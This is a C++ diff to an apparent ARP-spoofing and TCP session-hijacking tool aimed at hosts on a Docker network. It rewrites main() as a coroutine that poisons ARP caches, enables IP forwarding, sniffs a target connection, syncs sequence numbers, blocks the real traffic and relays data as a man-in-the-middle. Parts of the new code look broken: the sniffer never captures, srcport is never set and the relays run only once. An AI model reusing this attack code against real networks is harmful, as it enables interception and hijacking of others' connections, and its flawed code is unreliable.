@@ -15,6 +15,8 @@
 #include <iostream>
 #include <string>
 #include <thread>
+#include <coroutine>
+#include <exception>
 
 /* Collapse namespaces */
 using namespace std;
@@ -83,99 +85,111 @@ void clear_forward() {
     system("/bin/echo 0 > /proc/sys/net/ipv4/ip_forward");
     system("iptables --delete FORWARD --in-interface eth0 --jump ACCEPT");
 }
-int main() {
 
-    /* Set the interface */
-    string iface = "docker0";
+template<typename T>
+struct task;
 
-    ip_forward();
+// Specialization for void
+template<>
+struct task<void> {
+    struct promise_type;
+    using handle_type = std::coroutine_handle<promise_type>;
+    handle_type coro;
 
-    /* Set connection data */
-    string dst_ip = "172.17.0.2"; // <-- Destination IP
-    string src_ip = "172.17.0.3"; // <-- Spoof IP
-    short_word dstport = 1234; // <-- We know the spoofed IP connects to this port
+    task(handle_type h) : coro(h) {}
+    ~task() { if (coro) coro.destroy(); }
 
-    /* Begin the spoofing */
-    ARPContext *arp_context = ARPSpoofingReply(dst_ip, src_ip, iface);
+    void get() {
+        if (coro) {
+            coro.resume();
+            if (coro.done()) coro.promise().rethrow_if_exception();
+        }
+    }
 
-    /* Print some info */
+    struct promise_type {
+        std::exception_ptr exception;
+
+        auto get_return_object() { return task{handle_type::from_promise(*this)}; }
+        std::suspend_always initial_suspend() { return {}; }
+        std::suspend_always final_suspend() noexcept { return {}; }
+        void return_void() {} // Adjusted for void
+        void unhandled_exception() { exception = std::current_exception(); }
+
+        void rethrow_if_exception() {
+            if (exception) std::rethrow_exception(exception);
+        }
+    };
+};
+
+class SyncOperation {
+public:
+    explicit SyncOperation(TCPConnection& conn,TCPConnection& conn2 ) : _conn(conn),_conn2(conn2) {}
+
+    // Check if the operation is already complete (e.g., for immediate completion)
+    bool await_ready() const noexcept {
+        // Example condition, adapt based on your actual async operation
+        return false;
+    }
+
+    // Called by the compiler if await_ready returns false; suspends the coroutine
+    // std::coroutine_handle<> is a handle to the suspended coroutine
+    void await_suspend(std::coroutine_handle<> handle) {
+        // Initiate the async operation and provide a callback mechanism
+        // that will resume the coroutine once the operation completes.
+
+        auto payload = Payload();
+        _conn.Read(payload);
+        _conn2.Send(payload.GetRawPointer(), sizeof(*payload.GetRawPointer()));
+        handle.resume();
+    }
+
+    // Called by the compiler when the coroutine is resumed; retrieves the result
+    void await_resume() noexcept {
+        // Perform any cleanup or result retrieval necessary
+        // In this simple case, there's nothing to return or throw
+    }
+
+private:
+    TCPConnection& _conn;
+    TCPConnection& _conn2;
+};
+
+
+task<void> SyncAndBlockTraffic(string src_ip, string dst_ip, short_word dstport, string iface) {
+    // Begin the spoofing
+    ARPContext* arp_context = ARPSpoofingReply(dst_ip, src_ip, iface);
     PrintARPContext(*arp_context);
+
     string filter = "tcp and host " + dst_ip + " and host " + src_ip;
-    /* TCP stuff */
-    filter += " and dst port " + StrPort(dstport);
-    /* Launch the sniffer */
-    Sniffer sniff(filter, iface, PacketHandler);
-    sniff.Capture(1);
-    cout << "[@] Detected a source port: " << srcport << endl;
+    filter += " and dst port " + to_string(dstport);
 
-    /* ------------------------------------- */
+    // Launch the sniffer asynchronously
+    Sniffer(filter, iface, PacketHandler);
 
-    /* TCP connection victim to server */
-    auto tcp_v_to_s = new TCPConnection(src_ip, dst_ip, srcport, dstport, iface, TCPConnection::ESTABLISHED);
-    /* TCP connection server to victim */
-    auto tcp_s_to_v = new TCPConnection(dst_ip, src_ip, dstport, srcport, iface, TCPConnection::ESTABLISHED);
-    /* Both connection are already established... */
+    // TCP connections setup
+    auto tcp_v_to_s = make_unique<TCPConnection>(src_ip, dst_ip, srcport, dstport, iface, TCPConnection::ESTABLISHED);
+    auto tcp_s_to_v = make_unique<TCPConnection>(dst_ip, src_ip, dstport, srcport, iface, TCPConnection::ESTABLISHED);
 
-    /* [+] Synchronize the ACK and SEQ numbers
-     * This will block the program until some TCP packets from the spoofed connection
-     * pass through your computer...
-     */
+    // Synchronize the ACK and SEQ numbers
     tcp_v_to_s->Sync();
     tcp_s_to_v->Sync();
 
-    cout << "[@] Connections synchronized " << endl;
-
-    /* Give all this a second... */
-    // sleep(1);
-
-    /* Start blocking the traffic of the spoofed connection */
+    // Blocking traffic and other operations can also be converted to async tasks
     start_block(dst_ip, src_ip, dstport, srcport);
 
-    /* Reset the connection to the victim */
-    // tcp_s_to_v.Reset();
-    // tcp_s_to_v.KeepAlive();
-
-    auto op_data = (struct mvvm_op_data *)malloc(sizeof(struct mvvm_op_data));
-    op_data->op = MVVM_SOCK_FIN;
-    tcp_v_to_s->Send(((const byte_ *)op_data), sizeof(*op_data));
-    backend_thread.clear();
-    /* Close the spoofed connection with the server after we send our commands */
+    // Sending data, closing connections, etc., could be async as well
+    co_await SyncOperation(*tcp_v_to_s, *tcp_s_to_v);
+    co_await SyncOperation(*tcp_s_to_v, *tcp_v_to_s);
     tcp_v_to_s->Close();
-
-    sleep(10);
-    /* Clear everything */
-    // new dest_ip;
-    string dest_ip = "172.17.0.5";
-    // new port
-    // clear_block(dst_ip, src_ip, dstport, srcport);
-
-    tcp_v_to_s = new TCPConnection(src_ip, dst_ip, srcport, dstport, iface, TCPConnection::ESTABLISHED);
-
-    bool closed = false;
-    backend_thread.emplace_back([&]() {
-        while (!closed) {
-            auto payload = Payload();
-            tcp_v_to_s->Read(payload);
-            if (tcp_v_to_s->GetStatus() == TCPConnection::CLOSING) {
-                closed = true;
-                return;
-            }
-            tcp_s_to_v->Send(payload.GetRawPointer(), sizeof(*payload.GetRawPointer()));
-        }
-    });
-    backend_thread.emplace_back([&]() {
-        while (!closed) {
-            auto payload = Payload();
-            tcp_s_to_v->Read(payload);
-            if (tcp_s_to_v->GetStatus() == TCPConnection::CLOSING) {
-                closed = true;
-                return;
-            }
-            tcp_v_to_s->Send(payload.GetRawPointer(), sizeof(*payload.GetRawPointer()));
-        }
-    });
+    tcp_s_to_v->Close();
+    // Cleanup
     clear_forward();
     CleanARPContext(arp_context);
+}
+
+int main() {
+    auto task = SyncAndBlockTraffic("172.17.0.3", "172.17.0.2", 1234, "docker0");
+    task.get(); // In a real application, you would likely not wait in the main thread.
 
     return 0;
 }
